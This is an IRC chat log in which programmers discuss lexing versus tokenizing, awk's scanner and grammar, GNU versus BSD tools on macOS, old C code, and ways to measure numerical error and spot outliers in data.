[20:00:11] <Decker> the sphere is a place that for some reason moves the space that light is able to travel in, such that it never knows it was bent
[20:00:13] *** Quits: vysn (~vysn@user/vysn) (Ping timeout: 240 seconds)
[20:01:24] *** Joins: shokohsc (~shokohsc@lfbn-idf2-1-630-171.w86-246.abo.wanadoo.fr)
[20:02:59] *** Joins: FreeFull (~freefull@user-5-173-31-70.play-internet.pl)
[20:03:01] *** Joins: p4nus2k (~P4nuS2k@83-245-134-192.elisa-laajakaista.fi)
[20:04:38] <mrig> The light still thinks that it is Euclid :)
[20:04:42] <pyzozord> oh sweet sweet ibuprofen
[20:05:03] *** Quits: inomoz (~inomoz@176.59.118.12) (Read error: Connection reset by peer)
[20:05:06] <pyzozord> it's amazing how effective this stuff is
[20:05:45] <mishugana> pyzozord: true that. I just had a couple today (post lunch, of course)
[20:05:47] *** Joins: Nact (~l@host-85-27-122-83.dynamic.voo.be)
[20:05:59] <mrig> It is indeed, regular meditation works too, we dont realise how scrunched up we can get at times. 
[20:06:02] <mishugana> instant relief
[20:06:03] <pyzozord> i only ate two apples
[20:06:10] <pyzozord> but i couldn't waite longer
[20:06:23] <pyzozord> and the meal is still on it's way here
[20:06:25] <mishugana> my acid-sensitive stomach wouldn't be able to bear that!
[20:06:37] <mishugana> yeah, should never take it on an empty stomach
[20:06:58] <pyzozord> yes i should absolutely get back to meditation
[20:07:20] *** Joins: davidlowryduda (~davidlowr@2601:197:600:1210:31ff:a804:81e3:5196)
[20:07:26] <mishugana> there is just a letter change from medication to meditation.. heh
[20:08:06] *** Joins: jinsun (~quassel@user/jinsun)
[20:08:06] *** davidlowryduda is now known as dld
[20:09:20] *** Quits: Macuser (~Macuser@2600:1003:b447:e8e:ecb6:a4e5:40a1:d1ff) (Quit: Textual IRC Client: www.textualapp.com)
[20:10:33] <pyzozord> at the best point I was able to get in meditative state in just few seconds even in public transport
[20:11:19] <Decker> mrig haha yup :)
[20:11:35] *** Joins: inomoz (~inomoz@176.59.121.54)
[20:11:37] <Decker> in a reimanian manifold... that it alwasy measures as 1x1x1
[20:12:10] *** Joins: cthulchu (~Cthulchu@184-090-172-137.res.spectrum.com)
[20:12:37] *** Quits: inlight (~inlight@user/inlight) (Ping timeout: 240 seconds)
[20:13:02] <user51> https://github.com/onetrueawk/awk/blob/master/lex.c
[20:13:04] <bayaz> Title: awk/lex.c at master ? onetrueawk/awk 
[20:13:09] *** Joins: inlight (~inlight@157.42.219.134)
[20:13:10] *** Quits: inlight (~inlight@157.42.219.134) (Changing host)
[20:13:10] *** Joins: inlight (~inlight@user/inlight)
[20:13:33] <user51> is there a reason the important bits of this code couldn't be handled by a grammar?
[20:17:28] <Decker> https://gist.github.com/d3x0r/e15eeeec8b293b294803f9dc8ad87cbc   incomplete thoughts on building a UI to define parametric graphs
[20:17:29] <bayaz> Title: Not JS at all... general notes on parameters required to build general graphs... ? 
[20:17:40] <Decker> heh - title :) good.
[20:17:47] *** Joins: Leonardzzz (~Administr@114.55.127.80)
[20:18:36] <Decker> So I should implement my rotation library 
[20:18:40] <Decker> (in wolfram
[20:19:33] *** Quits: inky (inky@gateway/vpn/protonvpn/inky) (Ping timeout: 256 seconds)
[20:19:59] *** Joins: zer0bitz (~zer0bitz@196.244.192.60)
[20:20:50] <mishugana> user51: what do you mean by grammar?
[20:20:57] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 240 seconds)
[20:20:59] <mishugana> you mean the c bits?
[20:23:18] <mishugana> if so, https://github.com/onetrueawk/awk/blob/master/awkgram.y is the actual yacc file. `lex.c` is generated from that by the tool
[20:23:19] <bayaz> Title: awk/awkgram.y at master ? onetrueawk/awk 
[20:23:25] <user51> mishugana: https://github.com/onetrueawk/awk/blob/master/lex.c#L206
[20:23:54] <mishugana> I still don't understand the question
[20:25:24] <user51> if you look at the switch statement, it looks like a big decision table, so i was wondering if there's any reason it couldn't be encoded as a grammar
[20:26:36] <mishugana> That's just the scanner though ... how could it be simplified?
[20:27:37] *** Quits: hoochmonger (~hoochmong@user/hoochmonger) (Ping timeout: 240 seconds)
[20:28:35] <mishugana> you mean something like a lex input?
[20:30:35] *** Quits: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad) (Remote host closed the connection)
[20:32:39] *** Quits: mishugana (~mishugana@user/mishugana) (Quit: leaving)
[20:33:06] *** Joins: absc (~absc@dynamic-adsl-94-34-169-200.clienti.tiscali.it)
[20:33:26] *** Joins: gioyik (~gioyik@gateway/tor-sasl/gioyik)
[20:34:24] *** Joins: moose (~moose@user/moose)
[20:34:32] *** Quits: fe23 (~fe23@2409:8a34:464:4990:ac00:ae21:4f94:304c) (Quit: fe23)
[20:35:10] <pyzozord> saved by food and ibuprofen
[20:36:22] <pyzozord> kind of want to do some light reading but not sure if I can manage that with a headache lingering in the back of my head
[20:36:37] <pyzozord> but at least light doesn't hurt anymore
[20:36:46] <user51> you could try light writing :)
[20:36:59] <pyzozord> humm :)
[20:37:38] <pyzozord> my biggest problem with non-technical writing is that my writing skills are very poor
[20:37:46] <user51> i'm now in a mood for pizza
[20:38:03] <user51> mishugana left, but i wanted to hell them that i found what i was looking for: scannerless parsing
[20:38:20] <user51> or wait, did they change nick?
[20:38:21] *** Quits: jinsun (~quassel@user/jinsun) (Read error: Connection reset by peer)
[20:38:40] <pyzozord> some people have the vocabulary and some have amazingly "light pen" that's just easy to read, some other have such an effective way of explaining things simply
[20:38:43] <pyzozord> I have none of these
[20:39:09] <user51> maybe it's to go hunting rubber ducks :)
[20:40:07] *** Joins: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl)
[20:40:17] *** Quits: mrig (~mrig@user/mrig) (Ping timeout: 240 seconds)
[20:40:25] <pyzozord> i don't know the difference between lexing and tokenizing
[20:40:28] <user51> i'll admit that explaining is hard, but imo it's also complicated by the amount of factors involved. i couldn't explain to a nephew what they need to do for some java homework.
[20:40:39] *** Quits: inlight (~inlight@user/inlight) (Ping timeout: 256 seconds)
[20:41:01] *** Joins: inlight (~inlight@157.42.219.134)
[20:41:01] *** Quits: inlight (~inlight@157.42.219.134) (Changing host)
[20:41:01] *** Joins: inlight (~inlight@user/inlight)
[20:41:10] *** Joins: jinsun (~quassel@user/jinsun)
[20:41:58] <pyzozord> but I always thought that tokenizing is very simple: 1. Are you in a string mode? Yes: continue until quotes, make a string literal token. No: read until space, make a symbol token. Was the symbol only numbers? Change the token to number literal token
[20:42:22] *** Joins: mrig (~mrig@user/mrig)
[20:42:23] *** Joins: Akiva (~Akiva@user/Akiva)
[20:43:09] <pyzozord> oh ok well also recognize operators and some others, but like, very simple stuff
[20:43:12] <bjs> pyzozord: lexing is short for "lexical analysis" which is another way of saying tokenization. 
[20:43:25] <pyzozord> so they are exactly equivalent?
[20:43:45] <bjs> pyzozord: the way most people use the terms yes, they are synonymns.
[20:44:02] <bjs> There is also a tool called "lex" and the program that does tokenization is often called a "lexer"
[20:44:06] <pyzozord> is the way most people use the terms correct?
[20:44:15] <bjs> pyzozord: I mean, sure.
[20:44:31] <pyzozord> sometimes people get things wrong
[20:44:44] <pyzozord> and it sticks
[20:44:46] <bjs> a lexer does lexical analysis which produces a stream of tokens by tokenizing the input string  (would be a fine sentence)
[20:44:53] <user51> bjs: now we need a "yaccer" :)
[20:45:53] <bjs> pyzozord: tokenizing is usually seen as much simpler,  often it's basically no more complicated than something equivalent to regexes just to group together digits into a number and whitespace separated words into keywords and identifiers and things but isn't actually trying to look at the "structure" of the program
[20:46:20] <Stefan26> you have a baby calculator mrig?
[20:47:20] *** Joins: inky (~inky@5.77.223.178)
[20:47:45] *** Quits: rustyshackleford (uid236774@id-236774.helmsley.irccloud.com) (Quit: Connection closed for inactivity)
[20:47:47] <mrig> Stefan26 a simple recursive decent parser that generates basic isometric plots.
[20:47:49] <bjs> pyzozord: there's no hard rule about how much information the tokens should have vs how much information the parser should extract.  You could just make a tokenizer that output a stream of DIGIT, CHAR, WHITESPACE and NEWLINE tokens for example and have the parser do all the actual work of figuring out how to group them.
[20:48:43] <pyzozord> bjs: ok, so that's how I understand tokaninzing too, great. But since you mentioned that it is usually seen as much simpler, what is usually lexing seen as?
[20:48:52] *** Joins: rustyshackleford (uid236774@id-236774.helmsley.irccloud.com)
[20:49:08] *** Quits: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl) (Remote host closed the connection)
[20:49:10] <pyzozord> Do you mean it's seen as the same but just tokens have more information assigned? What kind of information?
[20:49:26] *** Joins: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl)
[20:50:50] *** Quits: jamea (~jamea@201.77.110.253) (Read error: Connection reset by peer)
[20:51:01] *** Joins: jamea22 (~jamea@201.77.110.253)
[20:52:36] <bjs> pyzozord: I mean that tokenizing/lexing is simpler than parsing
[20:52:42] *** Joins: AbleBacon (~AbleBacon@user/AbleBacon)
[20:53:33] <pyzozord> oh ok I get it
[20:53:49] <pyzozord> yeah then I think I have the right understand of tokenizing and lexing is just a synonym
[20:54:04] <pyzozord> *understanding
[20:54:08] *** Quits: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl) (Ping timeout: 256 seconds)
[20:54:36] <pyzozord> parsing is the tricky stuff
[20:55:04] *** Quits: kcrk (~kcrk@user/kcrk) (Quit: http://quassel-irc.org - Chat comfortably. Anywhere.)
[20:55:31] *** Joins: kcrk (~kcrk@user/kcrk)
[20:59:27] *** Joins: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470)
[21:01:00] *** Quits: wovixo (~wovixo@128.104.205.49) (Quit: Leaving)
[21:01:16] <pyzozord> the only annoying thing is that i need to use a mac
[21:02:00] <pyzozord> I know some people would be like "you are so ungrateful" but I don't care for the shiny metal laptop
[21:02:20] <edgar-rft> maybe you can cheat and use a bigmac instead
[21:02:22] <pyzozord> I like my gnu and debian utils
[21:02:49] <pyzozord> it's pretty big, but still it's not a bigmac, it's macpro
[21:03:48] <edgar-rft> I'll go now to macdonals and ask if they have bigmac pros
[21:04:09] <nomagno> pyzozord: Having just written a tokenizer, I can confirm it is super simple
[21:04:17] <mrig> the pros are cons
[21:04:25] <mrig> no hang on, the pros and cons.
[21:04:38] <mrig> dang now I'm all confuddled!
[21:04:47] <nomagno> By the way, jsmn is probably THE single best example of an efficient, imperative string tokenizer
[21:05:04] <nomagno> I basically copied its data structure model
[21:06:05] <nomagno> each token has a type e.g {section, key, value}, start and end indexes (Best marked relative to the string itself), and a parent
[21:06:09] *** Joins: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca)
[21:06:38] <pyzozord> I actually installed bash on that macbook because I can't stand zsh, I am too used to extended bash globs. Also installed texinfo because the default one is not gnu and has some weird key bindings
[21:07:10] <nomagno> I have never been able to stand texinfo
[21:07:37] <pyzozord> the gnu one is pretty good imo, only missing part is being able to scroll up and down by one line
[21:07:40] <nomagno> While I understand it is a better format, I'm just too used to troff/manpages
[21:08:02] <pyzozord> I think both are great and useful for different things
[21:08:19] <sonny> zsh as ext glob iirc
[21:08:24] <pyzozord> I wanna look up util usage flags on man, but I want a friendler user manual guide in info
[21:08:27] <sonny> s/as/has/
[21:08:48] <pyzozord> i looked up zsh's globs and they look different, dunno maybe I looked up wrong
[21:08:51] <mrig> oh is mac zsh?
[21:08:53] <sonny> info is just for gnu stuff tbh
[21:09:00] <pyzozord> yeah they switched from bash to zsh recently
[21:09:00] *** Joins: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b)
[21:09:27] <mrig> oh right, is that the default shell on BSD?
[21:09:35] <pyzozord> sonny: I got lots of gnu stuff I use and enjoy
[21:09:37] <[itchyjunk]> I can't tell if "tesla pi phone" is a spam or not.
[21:09:46] <nomagno> I only test my shell scripts with {dash, posh, zsh, k}
[21:09:50] <[itchyjunk]> Google generated dozens of links that talks about it.
[21:09:53] <nomagno> ksh, bash}
[21:09:57] <[itchyjunk]> Yet i am fairly certain it's all spam
[21:10:19] <nomagno> All of them, one after the other
[21:10:20] <pyzozord> sonny: although I don't think any scripts should ever relay on gnu extensions
[21:10:31] <nomagno> But I definitely thing the lighter shells are annoying as a user-facing shell
[21:10:33] <sonny> you need gnu stuff on mac?
[21:10:44] <sonny> don't they have bsd userland?
[21:10:48] <pyzozord> I want gnu stuff on mac
[21:10:52] *** Joins: ThePhilgrim (~ThePhilgr@78-69-18-227-no49.tbcn.telia.com)
[21:10:53] <sonny> oh ok
[21:11:00] <sonny> does mac ship make?
[21:11:13] <pyzozord> they do, but 1) I'm not that familiar with it, 2) it seems it has less features
[21:11:19] <sonny> it does
[21:11:26] <mrig> I like make.
[21:11:36] <pyzozord> I think they do ship make with xcode
[21:11:38] <mrig> never tried zsh.
[21:11:41] <nomagno> MacOS ships pretty much all utils you could ever want for typical usage with their 'dev' package
[21:12:12] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[21:12:20] *** Joins: medium_cool (~medium_co@2605:a601:a9aa:f800:f949:8533:c03:a236)
[21:12:24] *** Joins: ProfSimm (~ProfSimm@87.227.196.109)
[21:12:24] <pyzozord> I wasn't able to install xcode. I can only install xcode if from app store. I can only use app store if I have apple id. And I just removed my apple id. I was trying to create a new apple id, but it want's my phone number
[21:12:24] *** Joins: WilliamLeara (~wdl@cpe-76-185-2-28.tx.res.rr.com)
[21:12:27] <mrig> can you install linux on a mac when your 7 years are up?
[21:12:28] <pyzozord> it's insane
[21:12:51] *** Joins: blyat-73 (~hjgkjhgkj@46.235.96.249)
[21:12:52] <mrig> or do you just throw it away ...
[21:13:27] <pyzozord> nomagno: yeah that's true, but for me it's more about time invested in learning. I just don't want to learn mac stuff. I think learning linux stuff is better investment
[21:13:45] <ProfSimm> What do you think is the most foundational structure of reality, upon which everything else builds?
[21:13:48] <mrig> right time for me to switch back to linux, can't believe it took me a full day to get windows to be dev ready.
[21:13:53] <nomagno> pyzozord: Eh, install homebrew and macports
[21:13:55] <nomagno> and blast away
[21:14:02] <nomagno> you shouldn't notice a single difference
[21:14:12] <mrig> ProfSimm sound.
[21:14:13] *** Quits: mrig (~mrig@user/mrig) (Quit: Going offline, see ya! (www.adiirc.com))
[21:14:14] <nomagno> Well, you can treat it like a BSD distro
[21:14:16] *** Quits: swp (~Thunderbi@143.176.249.0) (Quit: swp)
[21:14:19] <nomagno> mostly
[21:14:19] *** Quits: Matt|home (~matt@adsl-74-233-58-81.mia.bellsouth.net) (Quit: Leaving)
[21:14:26] <pyzozord> nomagno: that's what I do. So far I installed bash and texinfo. The bash and info shipped with mac are not good enough
[21:14:30] <nomagno> Once you install the two major package managers
[21:14:42] <sonny> pkgsrc is on mac as well
[21:14:52] <pyzozord> the bash shipped with mac has freaking hardcoded warning "Bash is not default anymore, please upgrade!" on each session start
[21:14:54] *** Joins: swp (~Thunderbi@143.176.249.0)
[21:15:09] <sonny> doubt it's hardcoded
[21:15:09] <pyzozord> I know because I grepped entire system and it matched the bash executable binary
[21:15:16] <nomagno> I think there is a great BSD distro hiding within the unremovable weird GUI
[21:15:18] <sonny> oh
[21:15:20] <sonny> lol
[21:15:23] <pyzozord> yeah :D
[21:15:34] <sonny> weird
[21:15:45] <sonny> that could've just been a config setting
[21:15:48] <pyzozord> I'm not dealing with weird apple bs, I just install normal bash
[21:16:08] <nomagno> pyzozord: Manually swap it for 'Welcome, Pyzozord' and a bunch of null terminators
[21:16:16] <nomagno> Or even a string of the same length that is more pleasin
[21:16:19] <pyzozord> I was tempted to do that actually hehe
[21:16:24] <pyzozord> just hexedit the binary
[21:16:33] <nomagno> Yeah
[21:16:54] *** Quits: LucaTM (~LucaTM@user/lucatm) (Read error: Connection reset by peer)
[21:17:16] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:17:46] <pyzozord> sonny: it does make sense from apples perspective. Hardcoding message like that is one line. It has zero time and effort for apple. And it's robust. It's guaranteed to always be there. And it bullies people into upgrading into what apple wants them to use
[21:18:20] <sonny> less effort with a global bash profile
[21:18:38] <nomagno> I've taken up the habit of using the POSIX `od` over hexdump
[21:18:43] <pyzozord> I installed bash, texinfo and tmux. I wonder what else. Probably grep and find. I use those a lot
[21:18:54] <nomagno> Not really sure why, but I find it better in some ways
[21:18:55] <sonny> tmux is not gnu
[21:19:07] <pyzozord> yeah but it's better than screen
[21:19:16] <sonny> it came from OpenBSD
[21:19:26] <pyzozord> didn't know that
[21:19:38] <sonny> they have good userland ;)
[21:19:57] *** Quits: jonix1 (~jonix@82-181-193-234.bb.dnainternet.fi) (Ping timeout: 240 seconds)
[21:20:04] <sonny> terminal.app supports multiple windows anyways
[21:20:33] <pyzozord> i have too hand crafted tmux config
[21:20:41] <pyzozord> and too much muscle memory
[21:20:41] <sonny> oh ok
[21:21:12] <sonny> gnu has good software
[21:21:35] <sonny> gmake and gtar I'd probably use on mac as well
[21:21:41] <pyzozord> I think it's nice for users, it's bad for programs
[21:21:50] <sonny> what do you mean?
[21:22:04] <pyzozord> it's nice for users because it has a lot of convenient features
[21:22:15] *** Joins: jonix1 (~jonix@dktlr0yycfr3s--xk0pzt-3.rev.dnainternet.fi)
[21:22:17] <pyzozord> it's bad for programs because a lot of features mean bloated api
[21:22:24] <sonny> has nice documentation
[21:22:48] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:22:54] <pyzozord> yes the texinfo books are super nice. Especially on things like bash, gdb, gcc etc
[21:22:56] <sonny> bloated is a little harder to define
[21:23:14] <sonny> excess features, that I can see
[21:23:18] *** Quits: gioyik (~gioyik@gateway/tor-sasl/gioyik) (Ping timeout: 276 seconds)
[21:23:34] <pyzozord> and frankly looking up documentation in browser is so slow when you have good man and info pages installed
[21:23:35] <sonny> but these are like 20 year old programs, cruft is expected
[21:23:55] <sonny> especially from clever 90s c code
[21:24:06] <sonny> it's so cringe lol
[21:24:25] <pyzozord> the 90s c code?
[21:24:53] <sonny> yeah, that's 20 years ago
[21:25:16] <pyzozord> I'm not sure how old is nvi code, let me check
[21:25:45] <pyzozord> readme has been created in 2001 https://repo.or.cz/nvi.git
[21:25:47] <bayaz> Title: Public Git Hosting - nvi.git/summary 
[21:25:55] <sonny> what's nvi?
[21:25:57] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[21:25:59] <sonny> another vi clone?
[21:26:02] *** Joins: Narrat (~omnius@p200300df5f0aab1406ea56fffe2e7cdc.dip0.t-ipconnect.de)
[21:26:09] <pyzozord> bsd's vi reimplementation
[21:26:14] <sonny> ah
[21:26:31] <pyzozord> so I guess I can say I worked with 20 years old c code
[21:26:44] <sonny> how was it?
[21:27:00] <pyzozord> it's not that bad, it does get some getting used to, but honestly for the most part it's what I know anyway
[21:27:03] <nomagno> The code looks fine to me
[21:28:09] <sonny> well, it's not all going to be terrible :P
[21:28:18] <pyzozord> I guess C coding style hasn't progressed that much in last 20 years. Except in the last few years there have been some resurgance of attentions and some modern ideas found it's way to c programmer's editor
[21:29:01] <pyzozord> got the purals wrong but you get the idea
[21:29:09] <pyzozord> plurals*
[21:29:47] <pyzozord> ok I need to find some thing to do, I'm hogging up the irc space :P
[21:29:51] *** Joins: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl)
[21:29:53] <sonny> I noticed fdisk had a bug where a key combo triggered an infinite loop, so I tried to fix it. Ended up getting lost in callbacks and ad-hoc concurrency stuff. The problem was a race condition
[21:30:05] *** Quits: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl) (Remote host closed the connection)
[21:30:24] *** Joins: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl)
[21:30:27] <pyzozord> that just sounds like bad code in general
[21:31:00] *** Quits: exvicesindaco (~exvicio@host-82-50-190-112.retail.telecomitalia.it) (Quit: Going offline, see ya! (www.adiirc.com))
[21:31:15] <sonny> Also had some experiences trying to document netbsd protcol implemntations and it was just clever stuff I couldn't really follow
[21:31:28] <sonny> even for echo lol
[21:31:39] <sonny> but yeah, not all the code is that way
[21:31:52] <sonny> freebsd has some really simple stuff to follow
[21:32:14] <sonny> (may have been updated in the past 20 years tho)
[21:32:58] *** Quits: Jupp_S (~quassel@ip-88-153-154-129.hsi04.unitymediagroup.de) (Remote host closed the connection)
[21:33:07] <pyzozord> i like the idea of bsds, but I think just my internal temper/attitude is more of the messy linux style
[21:33:24] <Jong> What are some common stats when measuring accuracy and precision of an output array against some ground truth output?  Right now I iterate over both arrays, and for each value I compute max_relative_err = max(max_relative_err, (abs(a - b) / min(a, b)));
[21:33:29] <pyzozord> but neat and cohesive systems are always tempting
[21:33:39] <sonny> I prefer the BSDs myself
[21:34:47] <pyzozord> Jong: you can find some ideas for benchmarks here https://benchmarksgame-team.pages.debian.net/benchmarksgame/
[21:34:47] <bayaz> Title: Which programming language is fastest? | Computer Language Benchmarks Game 
[21:34:55] *** Quits: ozarker (~ozarker@user/ozarker) (Ping timeout: 256 seconds)
[21:34:55] <sonny> actually, I just prefer good documentation :P
[21:34:56] *** Quits: k3nn7 (~k3nn7@89-64-42-67.dynamic.chello.pl) (Ping timeout: 256 seconds)
[21:35:24] <pyzozord> Jong: I think the most common is throughput :P then just reads and just writes
[21:35:55] *** Quits: newpy (~newpy@2601:280:4381:1390:3d0c:64dc:3003:dbe5) (Remote host closed the connection)
[21:36:02] <sonny> sounds like he wants to do accuracy in measurements
[21:36:21] *** Joins: newpy (~newpy@2601:280:4381:1390:3d0c:64dc:3003:dbe5)
[21:36:22] <pyzozord> Jong: then you can get into the nitty gritty of probing cpu cache times, ram cache times, getting particular about which sectors are faster when etc
[21:36:23] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:36:40] <sonny> maybe a physics channel could help
[21:36:48] *** Joins: ttree (~ttree0@c-73-169-193-237.hsd1.wa.comcast.net)
[21:37:08] *** Joins: ozarker (~ozarker@user/ozarker)
[21:37:33] <pyzozord> I think just looking up the specs for ram chips and for cpu chips will give you the best idea for more common stats
[21:38:06] *** Joins: Jupp_S (~quassel@ip-88-153-154-129.hsi04.unitymediagroup.de)
[21:38:51] *** Quits: Geronimo (~Geronimo@user/geronimo) (Quit: I am away)
[21:39:07] <pyzozord> oh I know
[21:39:11] <pyzozord> Jong: check this https://www.hackernewspapers.com/2019/429-what-every-programmer-should-know-about-memory/
[21:39:11] <bayaz> Title: What Every Programmer Should Know About Memory 
[21:39:21] <Jong> thanks
[21:39:53] <pyzozord> I read half of it and gave up
[21:40:16] <sonny> nice, I just read a few pages
[21:40:21] <GeDaMo> https://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html
[21:40:22] <bayaz> Title: What Every Computer Scientist Should Know About Floating-Point Arithmetic 
[21:40:30] <Jong> pyzozord  I think you misunderstood me. I'm trying to measure how accurate a certain implementation is of an algorithm
[21:40:33] <pyzozord> did some basic measurments by looping over array of struct that was small and array of struct that was big and there was difference in order of magnitude
[21:40:45] <Jong> pyzozord  some numbers in the output array are off by as much as 10%
[21:40:48] <sonny> floating point is probably easier to read than the memory paper
[21:41:05] <GeDaMo> https://en.wikipedia.org/wiki/Kahan_summation_algorithm
[21:41:06] <bayaz> Title: Kahan summation algorithm - Wikipedia 
[21:41:08] *** Joins: Shashin (~Shashin@cpc112711-nmal22-2-0-cust53.19-2.cable.virginm.net)
[21:41:13] <pyzozord> Jong: hmm? I guess i did misunderstand you
[21:41:31] <Jong> pyzozord  I'm dealing with neural net stuff. For deep nets, imprecise math can exponentiate into poor accurate
[21:41:41] <user51> maybe memory should know about programmers
[21:41:45] <pyzozord> oh right floats
[21:41:48] <pyzozord> can't help there
[21:42:06] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[21:42:11] <sonny> user51 I would like to figre out what would happen if memory could talk
[21:42:13] <ProfSimm> Jong: no math is infinitely precise
[21:42:34] <Jong> right now I'm printing the greatest error in the output. If the output was an array of 100 numbers, I find print the number that deviates greatest from the ground truth number.
[21:43:10] <Jong> But finding the greatest error in the array doesn't tell me about whether the array over all is accurate or not. Maybe it was just that number that was way off but the other numbers are not
[21:43:27] <pyzozord> oh you want statistics
[21:43:34] <pyzozord> like standard deviation and stuff probably
[21:44:23] <[itchyjunk]> you can drop the outliers
[21:44:26] <[itchyjunk]> and average the rest
[21:44:40] <[itchyjunk]> and look at the difference with the expected value that way
[21:45:04] <pyzozord> I don't know how to select outliers
[21:46:28] *** Quits: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[21:46:42] *** Quits: Filohuhum (~dante@gateway/tor-sasl/filohuhum) (Ping timeout: 276 seconds)
[21:46:54] *** Quits: freep (~freepppp@62.1.245.43.dsl.dyn.forthnet.gr) (Quit: Leaving)
[21:47:08] <ProfSimm> Ask each number who's the biggest loser in class
[21:47:50] <pyzozord> what if they are all qually kind of losers
[21:47:54] <sonny> box and whisker plot identifiers this?
[21:48:27] <sonny> pyzozord you have some measure of center, outliers are far away
[21:48:38] *** Joins: mrig (~mrig@user/mrig)
[21:48:53] <user51> sonny: ransom access memory
[21:48:56] <sonny> if they are all losers, your data sucks
[21:49:40] *** Quits: p4nus2k (~P4nuS2k@83-245-134-192.elisa-laajakaista.fi) (Quit: WeeChat 2.8)
[21:50:03] <pyzozord> I don't think it can be simply cutoff point from center
[21:50:20] <sonny> why not?
[21:50:27] <pyzozord> what if it was growing gradually over time
[21:50:38] <pyzozord> then there is no outliers and many points far off center
[21:50:41] <[itchyjunk]> then your sample points were not enough
[21:51:01] <pyzozord> no I mean for example error rates for a web applications
[21:51:03] <sonny> growing in what sense
[21:51:06] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[21:51:08] <pyzozord> in a span of a year
[21:51:16] <sonny> yeah, so it's all measured
[21:51:25] <pyzozord> as traffic grows error counts naturally grow too
[21:51:31] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:51:34] <sonny> what does that change?
[21:51:41] <[itchyjunk]> depends on the error
[21:51:46] <pyzozord> what you are looking for is spikes
[21:51:47] <[itchyjunk]> the data should reflect if it changes or not
[21:51:55] <sonny> yeah
[21:51:57] <pyzozord> drastic sudden changes in error counts
[21:52:09] <[itchyjunk]> if your dataset is that sensitive to outliers, then not much to do about it
[21:52:14] <pyzozord> unless it's like "cuttoff point from running average" then ok
[21:52:26] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[21:52:27] <sonny> [itchyjunk] that's what I am thinking
[21:52:55] <[itchyjunk]> if your inferences are good, it should be implied by any significantly large subset of your data
[21:53:28] <pyzozord> i don't know what that means or how that would help
[21:53:47] <[itchyjunk]> infact, that is the idea behind supervised learning, you train it on 80% of the data and see if the 20% of the data imply the same core concept
[21:54:11] <pyzozord> i just know I have a website, that grew 100 times in traffic over last year, and with 100 times more traffic there is a lot more people with weird browsers blocking js or cookies and what not, producing flase positives
[21:54:20] *** Joins: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b)
[21:54:23] <pyzozord> and I want to ignore those and notice actuall errors that I have added to the code
[21:54:31] <[itchyjunk]> it means that if tossing away a few outlier significantly alters your data, it might be a bad dataset
[21:55:07] <pyzozord> oh we are talking about different usecases
[21:55:10] <[itchyjunk]> well, you infer what the false positive rates are in your dataset
[21:55:38] <[itchyjunk]> then you account for that
[21:55:59] *** Quits: alefir (~alefir@rrcs-24-43-248-58.west.biz.rr.com) (Quit: alefir)
[21:56:11] <[itchyjunk]> guess i am not longer sure if you want to clean your dataset or change your methods of inferences at this point
[21:56:17] <pyzozord> that's like saying "well you sit in the driving sit, and then you drive" :P
[21:56:19] *** Quits: Jigsy (~Jigsy@user/jigsy) (Quit: brb.)
[21:56:32] <[itchyjunk]> How is that?
[21:56:52] <pyzozord> i provided example usecase that is different than what question asker asked about
[21:56:55] <pyzozord> so that's on me
[21:57:03] <[itchyjunk]> you can either clean your dataset (which you didn't want to becuase it alters result) or you infer edge cases from the dataset without cleaning and account for that
[21:57:31] <pyzozord> yes my question about finding outliners was how exactly to infer the edge cases
[21:57:50] <pyzozord> but I guess "cuttoff point from running average" is a pretty simple and robust method
[21:57:53] <[itchyjunk]> there are probably many ways based on the type of data
[21:58:09] <[itchyjunk]> there are always ranges of interest, sure.
[21:58:41] <[itchyjunk]> if you care about clicks per user per visit and it generally between 10 and 20 but some have 100+, you can safely assume that 100+ are not representative of what you want to study
[21:58:43] <[itchyjunk]> possibly bots
[21:58:44] *** Joins: hqdruxn08__ (~hqdruxn08@cpe-66-68-166-214.austin.res.rr.com)
[21:59:15] *** Joins: gioyik (~gioyik@gateway/tor-sasl/gioyik)
[21:59:27] <pyzozord> or very enthusiastic users with sort patience
[22:00:09] <[itchyjunk]> sure, that's up to you to decide which data is more representative of your system
[22:00:13] <nomagno> pyzozord: When you talked about nvi, I was going to say it was commented so clever code is fine, however then I realized I have tons of clever code in the VM thingy without commenting, so I had to go comment and forgot to send the message
[22:00:17] *** Quits: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Ping timeout: 240 seconds)
[22:00:23] <nomagno> Result: Properly commented now!
[22:01:31] <pyzozord> nomagno: that's why I think good irc channels are like high quality random idea generators
[22:01:57] *** Quits: hqdruxn08_ (~hqdruxn08@cpe-66-68-166-214.austin.res.rr.com) (Ping timeout: 240 seconds)
